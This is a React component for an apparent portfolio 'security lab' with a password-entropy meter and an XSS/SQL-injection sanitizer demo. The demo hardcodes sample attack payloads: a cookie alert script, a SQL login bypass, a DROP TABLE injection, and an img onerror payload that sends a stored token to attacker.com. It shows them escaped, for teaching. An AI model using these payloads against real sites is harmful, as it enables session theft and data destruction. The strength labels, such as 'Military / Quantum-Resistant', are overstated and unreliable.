import React, { useState } from 'react';
import { 
  ShieldCheck, 
  Terminal, 
  KeyRound, 
  ShieldAlert, 
  CheckCircle, 
  XCircle, 
  Lock, 
  Flame, 
  Code,
  Sparkles,
  RefreshCw
} from 'lucide-react';

interface CyberPlaygroundProps {
  isDark: boolean;
}

export const CyberPlayground: React.FC<CyberPlaygroundProps> = ({ isDark }) => {
  const [activeTab, setActiveTab] = useState<'entropy' | 'sanitizer'>('entropy');

  // Password Entropy State
  const [testPassword, setTestPassword] = useState('CyberSec#2026!Aman');
  const [showPassword, setShowPassword] = useState(false);

  // Sanitizer State
  const samplePayloads = [
    "<script>alert('Stealing Cookies: ' + document.cookie)</script>",
    "admin' OR 1=1 --",
    "<img src=x onerror=fetch('http://attacker.com/steal?data=' + localStorage.getItem('token'))>",
    "'; DROP TABLE Users; --"
  ];
  const [rawInput, setRawInput] = useState(samplePayloads[0]);

  // Entropy Calculation logic
  const calculateEntropy = (pwd: string) => {
    if (!pwd) return { poolSize: 0, entropy: 0, crackTime: 'Instant', strength: 'None', color: 'text-red-400' };

    let pool = 0;
    if (/[a-z]/.test(pwd)) pool += 26;
    if (/[A-Z]/.test(pwd)) pool += 26;
    if (/[0-9]/.test(pwd)) pool += 10;
    if (/[^a-zA-Z0-9]/.test(pwd)) pool += 33;

    const entropy = Math.round(pwd.length * Math.log2(pool || 1));

    // Crack time estimation based on 100 billion guesses per second (RTX 4090 Hashcat benchmark for MD5/NTLM)
    const combinations = Math.pow(pool || 1, pwd.length);
    const guessesPerSec = 1e11; // 100 Billion/sec
    const seconds = combinations / (2 * guessesPerSec);

    let crackTime = 'Instant';
    if (seconds < 1) crackTime = '< 1 millisecond';
    else if (seconds < 60) crackTime = `${Math.round(seconds)} seconds`;
    else if (seconds < 3600) crackTime = `${Math.round(seconds / 60)} minutes`;
    else if (seconds < 86400) crackTime = `${Math.round(seconds / 3600)} hours`;
    else if (seconds < 31536000) crackTime = `${Math.round(seconds / 86400)} days`;
    else if (seconds < 31536000 * 100) crackTime = `${Math.round(seconds / 31536000)} years`;
    else if (seconds < 31536000 * 1e6) crackTime = `${(seconds / (31536000 * 1000)).toFixed(1)}k years`;
    else crackTime = 'Millions of Centuries (Unbreakable by Brute Force)';

    let strength = 'Weak';
    let color = 'text-red-400';
    if (entropy >= 80) {
      strength = 'Military / Quantum-Resistant';
      color = 'text-[#4edea3]';
    } else if (entropy >= 60) {
      strength = 'Strong (OWASP Compliant)';
      color = 'text-[#4cd7f6]';
    } else if (entropy >= 40) {
      strength = 'Moderate';
      color = 'text-amber-400';
    }

    return { poolSize: pool, entropy, crackTime, strength, color };
  };

  const metrics = calculateEntropy(testPassword);

  // Sanitizer transformation
  const sanitizeHtml = (str: string) => {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  };

  return (
    <section
      id="cyber-lab"
      className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 sm:py-24"
    >
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between mb-10 sm:mb-14 gap-6">
        <div className="flex flex-col gap-2">
          <div className="flex items-center gap-3">
            <span className="font-mono text-xs font-bold text-[#4cd7f6] uppercase tracking-wider">
              // 06. SECURITY LABS &amp; PLAYGROUND
            </span>
            <div className="h-0.5 w-12 bg-[#4cd7f6]/40 rounded-full"></div>
          </div>
          <h2
            id="cyber-lab-title"
            className={`text-3xl sm:text-4xl font-extrabold tracking-tight ${
              isDark ? 'text-[#dfe2f1]' : 'text-slate-900'
            }`}
          >
            Cybersecurity Interactive Sandbox
          </h2>
          <p
            className={`text-base sm:text-lg max-w-2xl ${
              isDark ? 'text-[#bcc9cd]' : 'text-slate-600'
            }`}
          >
            Live interactive demonstrations of cryptographic entropy metrics and defense-in-depth sanitization pipelines.
          </p>
        </div>

        {/* Tab Controls */}
        <div
          className={`flex items-center gap-1.5 p-1.5 rounded-xl border ${
            isDark ? 'bg-[#1c1f2a] border-[#262a35]' : 'bg-slate-100 border-slate-200'
          }`}
        >
          <button
            onClick={() => setActiveTab('entropy')}
            className={`px-4 py-2 rounded-lg font-mono text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${
              activeTab === 'entropy'
                ? 'bg-[#4cd7f6] text-[#003640] shadow-md'
                : isDark
                ? 'text-[#bcc9cd] hover:text-[#dfe2f1]'
                : 'text-slate-600 hover:text-slate-900'
            }`}
          >
            <KeyRound size={14} />
            <span>Entropy &amp; Brute-Force Lab</span>
          </button>

          <button
            onClick={() => setActiveTab('sanitizer')}
            className={`px-4 py-2 rounded-lg font-mono text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${
              activeTab === 'sanitizer'
                ? 'bg-[#4cd7f6] text-[#003640] shadow-md'
                : isDark
                ? 'text-[#bcc9cd] hover:text-[#dfe2f1]'
                : 'text-slate-600 hover:text-slate-900'
            }`}
          >
            <ShieldCheck size={14} />
            <span>XSS/SQLi Sanitizer Demo</span>
          </button>
        </div>
      </div>

      {/* Lab 1: Password Entropy */}
      {activeTab === 'entropy' ? (
        <div
          className={`p-6 sm:p-8 rounded-2xl border shadow-xl ${
            isDark ? 'bg-[#171b26] border-[#262a35]' : 'bg-white border-slate-200 shadow-slate-100'
          }`}
        >
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            {/* Left Input & Sliders */}
            <div className="lg:col-span-6 space-y-5">
              <div className="space-y-1.5">
                <label className="font-mono text-xs font-semibold text-[#4cd7f6] flex items-center gap-1.5">
                  <Lock size={14} />
                  <span>Test Passphrase / Secret Key</span>
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={testPassword}
                    onChange={(e) => setTestPassword(e.target.value)}
                    placeholder="Type password to audit..."
                    className={`w-full px-4 py-3 rounded-xl font-mono text-sm border focus:outline-none focus:ring-2 focus:ring-[#4cd7f6] ${
                      isDark
                        ? 'bg-[#0a0e18] border-[#262a35] text-[#dfe2f1]'
                        : 'bg-slate-50 border-slate-200 text-slate-900'
                    }`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3 font-mono text-xs text-[#869397] hover:text-[#4cd7f6]"
                  >
                    {showPassword ? 'HIDE' : 'SHOW'}
                  </button>
                </div>
                <span className="font-mono text-[11px] text-[#869397] block">
                  Audited purely client-side in browser memory. Zero packets transmitted.
                </span>
              </div>

              {/* OWASP Checklist */}
              <div
                className={`p-4 rounded-xl border space-y-2.5 font-mono text-xs ${
                  isDark ? 'bg-[#0a0e18] border-[#262a35]' : 'bg-slate-50 border-slate-200'
                }`}
              >
                <span className="font-bold text-[#4edea3] block text-[11px] uppercase tracking-wider">
                  OWASP Defense Matrix Checklist
                </span>
                <div className="grid grid-cols-2 gap-2">
                  <div className="flex items-center gap-1.5">
                    {testPassword.length >= 12 ? (
                      <CheckCircle size={14} className="text-[#4edea3]" />
                    ) : (
                      <XCircle size={14} className="text-red-400" />
                    )}
                    <span>Length $\ge$ 12 chars ({testPassword.length})</span>
                  </div>

                  <div className="flex items-center gap-1.5">
                    {/[A-Z]/.test(testPassword) && /[a-z]/.test(testPassword) ? (
                      <CheckCircle size={14} className="text-[#4edea3]" />
                    ) : (
                      <XCircle size={14} className="text-red-400" />
                    )}
                    <span>Mixed Case (A-Z, a-z)</span>
                  </div>

                  <div className="flex items-center gap-1.5">
                    {/[0-9]/.test(testPassword) ? (
                      <CheckCircle size={14} className="text-[#4edea3]" />
                    ) : (
                      <XCircle size={14} className="text-red-400" />
                    )}
                    <span>Numbers (0-9)</span>
                  </div>

                  <div className="flex items-center gap-1.5">
                    {/[^a-zA-Z0-9]/.test(testPassword) ? (
                      <CheckCircle size={14} className="text-[#4edea3]" />
                    ) : (
                      <XCircle size={14} className="text-red-400" />
                    )}
                    <span>Special Symbols (#$!%)</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Right Telemetry Dashboard */}
            <div
              className={`lg:col-span-6 p-6 rounded-xl border flex flex-col justify-between gap-6 ${
                isDark ? 'bg-[#0a0e18] border-[#262a35]' : 'bg-slate-900 text-white border-slate-800'
              }`}
            >
              <div className="space-y-4">
                <div className="flex items-center justify-between border-b border-[#262a35] pb-3">
                  <span className="font-mono text-xs text-[#869397]">MATHEMATICAL ENTROPY SCORE</span>
                  <span className={`font-mono text-lg font-bold ${metrics.color}`}>
                    {metrics.entropy} Bits
                  </span>
                </div>

                <div className="space-y-1.5">
                  <span className="font-mono text-xs text-[#869397]">TIME TO BRUTE-FORCE (100 Billion hashes/sec):</span>
                  <p className={`text-xl sm:text-2xl font-black font-mono tracking-tight ${metrics.color}`}>
                    {metrics.crackTime}
                  </p>
                  <p className="text-xs text-[#869397] font-mono">
                    Pool Size: {metrics.poolSize} unique glyphs • Resistance: {metrics.strength}
                  </p>
                </div>
              </div>

              {/* Progress Bar of Entropy */}
              <div className="space-y-1.5 pt-2">
                <div className="flex justify-between text-[11px] font-mono text-[#869397]">
                  <span>0 Bits (Trivial)</span>
                  <span>60 Bits (Secure)</span>
                  <span>100+ Bits (Military)</span>
                </div>
                <div className="w-full h-2 rounded-full bg-[#1c1f2a] overflow-hidden">
                  <div
                    className="h-full bg-gradient-to-r from-red-500 via-amber-400 to-[#4edea3] transition-all duration-300"
                    style={{ width: `${Math.min(100, (metrics.entropy / 100) * 100)}%` }}
                  ></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : (
        /* Lab 2: Input Sanitization & XSS Defense */
        <div
          className={`p-6 sm:p-8 rounded-2xl border shadow-xl ${
            isDark ? 'bg-[#171b26] border-[#262a35]' : 'bg-white border-slate-200 shadow-slate-100'
          }`}
        >
          <div className="space-y-6">
            <div>
              <span className="font-mono text-xs font-semibold text-[#4edea3] block mb-2">
                Select Attack Vector / Malicious Infiltration Payload:
              </span>
              <div className="flex flex-wrap gap-2">
                {samplePayloads.map((payload, i) => (
                  <button
                    key={i}
                    onClick={() => setRawInput(payload)}
                    className={`font-mono text-xs px-3 py-1.5 rounded-lg border transition-all cursor-pointer ${
                      rawInput === payload
                        ? 'bg-[#4cd7f6] text-[#003640] border-[#4cd7f6] font-bold'
                        : isDark
                        ? 'bg-[#0a0e18] text-[#bcc9cd] border-[#262a35] hover:border-[#4cd7f6]/40'
                        : 'bg-slate-100 text-slate-800 border-slate-200 hover:bg-slate-200'
                    }`}
                  >
                    Payload #{i + 1}
                  </button>
                ))}
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Raw Hazardous Input */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-xs font-bold text-red-400 flex items-center gap-1.5">
                    <ShieldAlert size={14} />
                    <span>Untrusted Ingress Input (Hostile)</span>
                  </span>
                  <span className="font-mono text-[10px] text-red-400 uppercase font-bold">Vulnerable</span>
                </div>
                <div className="p-4 rounded-xl font-mono text-xs bg-red-950/20 border border-red-500/30 text-red-300 break-all leading-relaxed">
                  {rawInput}
                </div>
                <p className="font-mono text-[11px] text-[#869397]">
                  If injected unescaped into innerHTML or raw SQL query, triggers unauthorized script execution or database exfiltration.
                </p>
              </div>

              {/* Hardened Defense Sanitization */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-mono text-xs font-bold text-[#4edea3] flex items-center gap-1.5">
                    <ShieldCheck size={14} />
                    <span>Hardened &amp; Sanitized Entity Pipeline</span>
                  </span>
                  <span className="font-mono text-[10px] text-[#4edea3] uppercase font-bold">Mitigated</span>
                </div>
                <div className="p-4 rounded-xl font-mono text-xs bg-emerald-950/20 border border-[#4edea3]/30 text-[#4edea3] break-all leading-relaxed">
                  {sanitizeHtml(rawInput)}
                </div>
                <p className="font-mono text-[11px] text-[#869397]">
                  HTML entities escaped into non-executable glyph representations. Zero DOM script execution.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}
    </section>
  );
};
